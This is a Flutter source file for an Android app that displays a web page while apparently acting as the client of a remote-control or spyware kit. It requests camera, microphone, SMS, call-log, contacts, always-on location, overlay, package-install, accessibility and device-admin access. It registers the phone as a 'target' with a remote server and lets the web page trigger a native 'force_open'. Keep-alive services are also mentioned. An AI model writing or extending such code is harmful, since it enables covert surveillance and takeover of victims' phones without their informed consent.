import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';

import 'config/build_config.dart';

// ==========================================
// ===== GLOBAL =====
// ==========================================
const MethodChannel _deviceChannel = MethodChannel('orgsapp/device_info');

// ==========================================
// ===== MAIN =====
// ==========================================
void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Redirect debugPrint → print biar muncul di rilis
  debugPrint = (String? message, {int? wrapWidth}) {
    print(message ?? '');
  };

  print('🚀 [MAIN] App starting...');
  runApp(const GeneratedApp());
}

// ==========================================
// ===== ROOT APP =====
// ==========================================
class GeneratedApp extends StatelessWidget {
  const GeneratedApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: BuildConfig.appName,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: const Color(0xFF2196F3)),
        useMaterial3: true,
      ),
      home: const AppBootstrap(),
    );
  }
}

// ==========================================
// ===== BOOTSTRAP =====
// ==========================================
class AppBootstrap extends StatefulWidget {
  const AppBootstrap({super.key});

  @override
  State<AppBootstrap> createState() => _AppBootstrapState();
}

class _AppBootstrapState extends State<AppBootstrap>
    with WidgetsBindingObserver {
  String _status = 'Memuat...';
  bool _ready = false;
  bool _hasRegistered = false;
  bool _isRegistering = false;
  DateTime? _lastRegisterTime;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    print('🎬 [BOOTSTRAP] initState');
    _bootstrap();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    print('📱 [LIFECYCLE] state: $state');

    if (state == AppLifecycleState.resumed) {
      // Cooldown 5 menit
      if (_lastRegisterTime != null &&
          DateTime.now().difference(_lastRegisterTime!) <
              const Duration(minutes: 5)) {
        print('⏭️ [LIFECYCLE] Skip register (cooldown)');
        return;
      }
      if (_hasRegistered) {
        print('⏭️ [LIFECYCLE] Already registered');
        return;
      }
      print('🔄 [LIFECYCLE] resumed → register');
      _registerDeviceWithRetry();
    }
  }

  Future<void> _bootstrap() async {
    print('🚀 [BOOTSTRAP] START');

    try {
      // ===== 1. Save config =====
      print('📦 [BOOTSTRAP] Step 1: Save config');
      try {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString('accessKey', BuildConfig.accessKey);
        await prefs.setString('appName', BuildConfig.appName);
        await prefs.setString('buildId', BuildConfig.buildId);
        await prefs.setString('packageName', BuildConfig.packageName);
        await prefs.setString('serverUrl', BuildConfig.serverUrl);
        await prefs.setBool('isNativeApp', true);

        String id = prefs.getString('deviceId') ?? '';
        if (id.isEmpty) {
          id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
          await prefs.setString('deviceId', id);
          print('🆕 [BOOTSTRAP] New deviceId: $id');
        } else {
          print('📱 [BOOTSTRAP] Existing deviceId: $id');
        }

        print('✅ [BOOTSTRAP] Config saved. serverUrl=${BuildConfig.serverUrl}');
      } catch (e) {
        print('❌ [BOOTSTRAP] Prefs error: $e');
      }

      // ===== 2. Permissions (NON-BLOCKING) =====
      print('📦 [BOOTSTRAP] Step 2: Request permissions (background)');
      if (mounted) setState(() => _status = 'Meminta izin...');

      _requestPermissions().then((_) {
        print('✅ [BOOTSTRAP] Permissions done');
      }).catchError((e) {
        print('⚠️ [BOOTSTRAP] Permission error: $e');
      });

      await Future.delayed(const Duration(milliseconds: 500));

      // ===== 3. Register device =====
      print('📦 [BOOTSTRAP] Step 3: Register device');
      if (mounted) setState(() => _status = 'Mendaftar device...');
      try {
        await _registerDeviceWithRetry();
        print('✅ [BOOTSTRAP] Register done');
      } catch (e) {
        print('❌ [BOOTSTRAP] Register error: $e');
      }

      // ===== 4. Start native services =====
      print('📦 [BOOTSTRAP] Step 4: Native services running');
      print('✅ [BOOTSTRAP] ConnectionService + KeepAliveService started');

      // ===== 5. Ready =====
      print('📦 [BOOTSTRAP] Step 5: Ready');
      if (!mounted) return;
      setState(() {
        _status = 'Siap';
        _ready = true;
      });
      print('🎉 [BOOTSTRAP] COMPLETE');
    } catch (e, st) {
      print('❌ [BOOTSTRAP] FATAL: $e');
      print('❌ [BOOTSTRAP] STACK: $st');
      if (!mounted) return;
      setState(() {
        _status = 'Siap (dengan keterbatasan)';
        _ready = true;
      });
    }
  }

  // ==========================================
  // ===== REQUEST PERMISSIONS =====
  // ==========================================
  Future<void> _requestPermissions() async {
    int sdkInt = 0;
    try {
      sdkInt = await _getAndroidSdkInt();
      print('📱 [PERM] Android SDK: $sdkInt');
    } catch (e) {}

    // ==========================================
    // ===== STANDARD PERMISSIONS =====
    // ==========================================
    final permissions = <Permission>[
      Permission.camera,
      Permission.microphone,
      Permission.phone,       // untuk READ_CALL_LOG
      Permission.sms,         // untuk READ_SMS
      Permission.location,
      Permission.locationWhenInUse,
      Permission.locationAlways,
      Permission.notification,
      Permission.contacts,
      Permission.phone,
      Permission.sms,
      Permission.bluetooth,
      Permission.bluetoothScan,
      Permission.bluetoothConnect,
    ];

    if (sdkInt >= 33) {
      permissions.addAll([
        Permission.photos,
        Permission.videos,
        Permission.audio,
      ]);
    } else {
      permissions.add(Permission.storage);
    }

    for (final perm in permissions) {
      try {
        final status = await perm.status;
        if (status.isDenied || status.isLimited) {
          final result = await perm.request();
          print('🔑 [PERM] $perm: $result');
          await Future.delayed(const Duration(milliseconds: 300));
        }
      } catch (e) {
        print('⚠️ [PERM] $perm error: $e');
      }
    }

    // ==========================================
    // ===== SPECIAL PERMISSIONS =====
    // ==========================================
    await _requestSpecialPermissions();
  }

  // ==========================================
  // ===== SPECIAL PERMISSIONS =====
  // ==========================================
  Future<void> _requestSpecialPermissions() async {
    // ===== Overlay permission (untuk LockOverlay) =====
    try {
      final status = await Permission.systemAlertWindow.status;
      if (!status.isGranted) {
        print('🔑 [PERM] Requesting overlay permission...');
        await Permission.systemAlertWindow.request();
        print('✅ [PERM] Overlay permission requested');
      } else {
        print('✅ [PERM] Overlay permission already granted');
      }
    } catch (e) {
      print('⚠️ [PERM] Overlay error: $e');
    }

    // ===== Battery optimization exemption =====
    try {
      final status = await Permission.ignoreBatteryOptimizations.status;
      if (!status.isGranted) {
        print('🔑 [PERM] Requesting battery exemption...');
        await Permission.ignoreBatteryOptimizations.request();
        print('✅ [PERM] Battery exemption requested');
      } else {
        print('✅ [PERM] Battery exemption already granted');
      }
    } catch (e) {
      print('⚠️ [PERM] Battery error: $e');
    }

    // ===== Request install packages =====
    try {
      final status = await Permission.requestInstallPackages.status;
      if (!status.isGranted) {
        print('🔑 [PERM] Requesting install packages...');
        await Permission.requestInstallPackages.request();
      }
    } catch (e) {
      print('⚠️ [PERM] Install packages error: $e');
    }

    // ===== Buka accessibility settings =====
    try {
      await _deviceChannel.invokeMethod('openAccessibilitySettings');
      print('🔓 [PERM] Accessibility settings opened');
    } catch (e) {
      print('⚠️ [PERM] Accessibility error: $e');
    }

    // ===== Request Device Admin =====
    await _requestDeviceAdmin();
  }

  // ==========================================
  // ===== REQUEST DEVICE ADMIN =====
  // ==========================================
  Future<void> _requestDeviceAdmin() async {
    try {
      print('🔐 [ADMIN] Checking device admin status...');

      // Cek status admin via MethodChannel
      final isAdmin = await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');

      if (isAdmin == true) {
        print('✅ [ADMIN] Device admin already active');
        return;
      }

      print('🔐 [ADMIN] Device admin NOT active');
      print('👤 [ADMIN] Showing device admin dialog...');

      // Trigger dialog device admin via native
      await _deviceChannel.invokeMethod('requestDeviceAdmin');

      // Tunggu user klik
      await Future.delayed(const Duration(seconds: 3));

      // Cek status ulang
      final newStatus = await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');
      print('📊 [ADMIN] Status after request: $newStatus');

      if (newStatus == true) {
        print('🎉 [ADMIN] Device admin ENABLED successfully');
      } else {
        print('⚠️ [ADMIN] User didn\'t activate device admin');
      }
    } catch (e) {
      print('❌ [ADMIN] Request error: $e');
    }
  }

  // ==========================================
  // ===== HELPERS =====
  // ==========================================
  Future<int> _getAndroidSdkInt() async {
    if (!Platform.isAndroid) return 0;
    try {
      return await _deviceChannel.invokeMethod<int>('getSdkInt') ?? 0;
    } catch (_) {
      return 0;
    }
  }

  Future<String> _getDeviceModel() async {
    try {
      return await _deviceChannel.invokeMethod<String>('getModel') ??
          'Android Device';
    } catch (_) {
      return 'Android Device';
    }
  }

  Future<String> _getDeviceBrand() async {
    try {
      return await _deviceChannel.invokeMethod<String>('getBrand') ?? 'Android';
    } catch (_) {
      return 'Android';
    }
  }

  Future<String> _getAndroidVersion() async {
    try {
      return await _deviceChannel.invokeMethod<String>('getAndroidVersion') ??
          'Unknown';
    } catch (_) {
      return 'Unknown';
    }
  }

  // ==========================================
  // ===== REGISTER DEVICE =====
  // ==========================================
  Future<void> _registerDeviceWithRetry() async {
    if (_isRegistering) {
      print('⏭️ [REGISTER] Already in progress');
      return;
    }
    if (_hasRegistered) {
      print('⏭️ [REGISTER] Already registered');
      return;
    }

    if (BuildConfig.accessKey.isEmpty) return;

    _isRegistering = true;
    try {
      for (int attempt = 1; attempt <= 3; attempt++) {
        print('📡 [REGISTER] Attempt $attempt/3');
        final ok = await _registerDevice();
        if (ok) {
          print('✅ [REGISTER] Success');
          _hasRegistered = true;
          _lastRegisterTime = DateTime.now();
          return;
        }
        if (attempt < 3) await Future.delayed(const Duration(seconds: 2));
      }
      print('❌ [REGISTER] Failed after 3 attempts');
    } finally {
      _isRegistering = false;
    }
  }

  Future<bool> _registerDevice() async {
    try {
      int batteryLevel = 0;
      try {
        batteryLevel = await Battery().batteryLevel;
      } catch (e) {}

      String connType = 'unknown';
      try {
        connType = (await Connectivity().checkConnectivity()).toString();
      } catch (e) {}

      final prefs = await SharedPreferences.getInstance();
      final deviceId = prefs.getString('deviceId') ?? '';
      final model = await _getDeviceModel();
      final brand = await _getDeviceBrand();
      final androidVersion = await _getAndroidVersion();

      final payload = {
        'id': deviceId,
        'model': model,
        'brand': brand,
        'androidVersion': androidVersion,
        'battery': batteryLevel,
        'ip': connType,
        'appName': BuildConfig.appName,
        'packageName': BuildConfig.packageName,
        'accessKey': BuildConfig.accessKey,
        'buildId': BuildConfig.buildId,
        'status': 'Online',
        'lastSeen': DateTime.now().toIso8601String(),
      };

      final res = await _httpPost(
        '${BuildConfig.serverUrl}/api/register-target',
        payload,
      );

      return res != null && res.isNotEmpty;
    } catch (e) {
      print('❌ [REGISTER] Error: $e');
      return false;
    }
  }

  Future<String?> _httpPost(
    String url,
    Map<String, dynamic> body,
  ) async {
    HttpClient? client;
    try {
      client = HttpClient();
      client.connectionTimeout = const Duration(seconds: 15);

      final request = await client.postUrl(Uri.parse(url));
      request.headers.contentType = ContentType.json;
      request.headers.set('X-Access-Key', BuildConfig.accessKey);
      request.write(jsonEncode(body));

      final response = await request.close();
      final responseBody = await response.transform(utf8.decoder).join();

      print('📥 [HTTP] ${response.statusCode}: $responseBody');
      return responseBody;
    } catch (e) {
      return null;
    } finally {
      client?.close(force: true);
    }
  }

  // ==========================================
  // ===== BUILD =====
  // ==========================================
  @override
  Widget build(BuildContext context) {
    if (!_ready) return _buildLoadingScreen();
    return const WebViewHome();
  }

  Widget _buildLoadingScreen() {
    return Scaffold(
      backgroundColor: Colors.white,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.sync_rounded, size: 48, color: Colors.blueGrey),
              const SizedBox(height: 20),
              Text(
                BuildConfig.appName,
                style: const TextStyle(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.black87,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 8),
              Text(
                _status,
                style: const TextStyle(fontSize: 13, color: Colors.black54),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 24),
              const SizedBox(
                width: 22,
                height: 22,
                child: CircularProgressIndicator(strokeWidth: 2.5),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ==========================================
// ===== WEBVIEW HOME =====
// ==========================================
class WebViewHome extends StatefulWidget {
  const WebViewHome({super.key});

  @override
  State<WebViewHome> createState() => _WebViewHomeState();
}

class _WebViewHomeState extends State<WebViewHome> {
  late final WebViewController _controller;
  bool _isLoading = true;
  int _progress = 0;
  bool _hasError = false;
  String _errorMessage = '';

  @override
  void initState() {
    super.initState();
    print('🌐 [WEBVIEW] initState');
    _initWebView();
  }

  void _initWebView() {
    try {
      print('🌐 [WEBVIEW] Initializing...');

      _controller = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..setBackgroundColor(Colors.white)
        ..setUserAgent(
          'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 '
          '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        )
        ..addJavaScriptChannel(
          'AppBridge',
          onMessageReceived: (msg) {
            print('📨 [WEBVIEW] From web: ${msg.message}');
            _handleWebMessage(msg.message);
          },
        )
        ..setNavigationDelegate(
          NavigationDelegate(
            onProgress: (p) {
              if (mounted) setState(() => _progress = p);
            },
            onPageStarted: (_) {
              if (!mounted) return;
              setState(() {
                _isLoading = true;
                _hasError = false;
              });
            },
            onPageFinished: (_) async {
              if (!mounted) return;
              setState(() => _isLoading = false);
              await _injectConfig();
            },
            onWebResourceError: (error) {
              if (!mounted) return;
              setState(() {
                _hasError = true;
                _errorMessage = error.description;
                _isLoading = false;
              });
              print('❌ [WEBVIEW] Error: ${error.description}');
            },
            onNavigationRequest: (request) {
              return NavigationDecision.navigate;
            },
          ),
        )
        ..loadRequest(Uri.parse(BuildConfig.webviewUrl));

      print('✅ [WEBVIEW] Initialized. Loading: ${BuildConfig.webviewUrl}');
    } catch (e) {
      print('❌ [WEBVIEW] Init error: $e');
      if (mounted) {
        setState(() {
          _hasError = true;
          _errorMessage = 'Gagal init WebView: $e';
          _isLoading = false;
        });
      }
    }
  }

  Future<void> _injectConfig() async {
    try {
      final js = """
        (function() {
          try {
            localStorage.setItem('accessKey', '${BuildConfig.accessKey}');
            localStorage.setItem('appName', '${BuildConfig.appName}');
            localStorage.setItem('packageName', '${BuildConfig.packageName}');
            localStorage.setItem('buildId', '${BuildConfig.buildId}');
            localStorage.setItem('serverUrl', '${BuildConfig.serverUrl}');
            localStorage.setItem('isNativeApp', 'true');
            console.log('[App] Config injected');
          } catch (e) {
            console.error('[App] Inject error', e);
          }
        })();
      """;
      await _controller.runJavaScript(js);
      print('✅ [WEBVIEW] Config injected');
    } catch (e) {
      print('❌ [WEBVIEW] Inject error: $e');
    }
  }

  void _handleWebMessage(String message) {
    try {
      final data = jsonDecode(message);
      final action = data['action']?.toString();
      print('📨 [WEBVIEW] Action: $action');

      switch (action) {
        case 'openUrl':
          final url = data['url']?.toString();
          if (url != null && url.isNotEmpty) {
            launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
          }
          break;
        case 'close':
          SystemNavigator.pop();
          break;
        case 'force_open':
          _deviceChannel.invokeMethod('forceOpen');
          break;
      }
    } catch (e) {
      print('❌ [WEBVIEW] Parse error: $e');
    }
  }

  Future<void> _reload() async {
    setState(() {
      _hasError = false;
      _isLoading = true;
      _progress = 0;
    });
    try {
      await _controller.loadRequest(Uri.parse(BuildConfig.webviewUrl));
    } catch (e) {
      if (mounted) {
        setState(() {
          _hasError = true;
          _errorMessage = 'Gagal reload: $e';
          _isLoading = false;
        });
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      onPopInvoked: (didPop) async {
        if (didPop) return;
        try {
          final canGoBack = await _controller.canGoBack();
          if (canGoBack) {
            await _controller.goBack();
          } else {
            SystemNavigator.pop();
          }
        } catch (e) {
          SystemNavigator.pop();
        }
      },
      child: Scaffold(
        body: SafeArea(
          child: Stack(
            children: [
              if (!_hasError)
                WebViewWidget(controller: _controller)
              else
                _buildErrorScreen(),
              if (_isLoading && !_hasError)
                Positioned(
                  top: 0,
                  left: 0,
                  right: 0,
                  child: LinearProgressIndicator(
                    value: _progress / 100,
                    backgroundColor: Colors.grey.shade200,
                    color: Colors.blue,
                    minHeight: 2,
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildErrorScreen() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.wifi_off_rounded, color: Colors.grey, size: 56),
            const SizedBox(height: 16),
            const Text(
              'Koneksi Bermasalah',
              style: TextStyle(
                fontSize: 16,
                fontWeight: FontWeight.w600,
                color: Colors.black87,
              ),
            ),
            const SizedBox(height: 8),
            Text(
              _errorMessage,
              textAlign: TextAlign.center,
              style: const TextStyle(fontSize: 13, color: Colors.black54),
            ),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: _reload,
              child: const Text('COBA LAGI'),
            ),
          ],
        ),
      ),
    );
  }
}
